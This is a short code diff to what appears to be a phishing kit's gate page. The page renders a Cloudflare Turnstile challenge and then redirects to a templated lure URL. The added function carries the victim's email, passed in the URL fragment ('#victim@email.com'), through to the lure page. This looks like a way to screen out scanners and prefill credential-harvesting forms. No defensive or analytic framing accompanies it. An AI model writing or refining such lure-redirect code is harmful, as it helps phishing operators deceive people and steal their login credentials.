@@ -16,11 +16,22 @@ Loading...
 <div id="cf-turnstile"></div>
 
 <script>
+// Preserve URL fragment (e.g. #victim@email.com) across the Turnstile redirect —
+// location.assign() does NOT carry the old fragment, so re-attach it explicitly.
+function goWithFragment() {
+    var dest = {lure_url_js};
+    try {
+        if (window.location.hash && dest.indexOf('#') === -1) {
+            dest += window.location.hash;
+        }
+    } catch(e) {}
+    window.location.assign(dest);
+}
 turnstile.ready(function () {
         turnstile.render('#cf-turnstile', {
             sitekey: '1x00000000000000000000BB', // replace this with your own sitekey
             callback: function(token) {
-                window.location.assign({lure_url_js});
+                goWithFragment();
             },
         });
     });
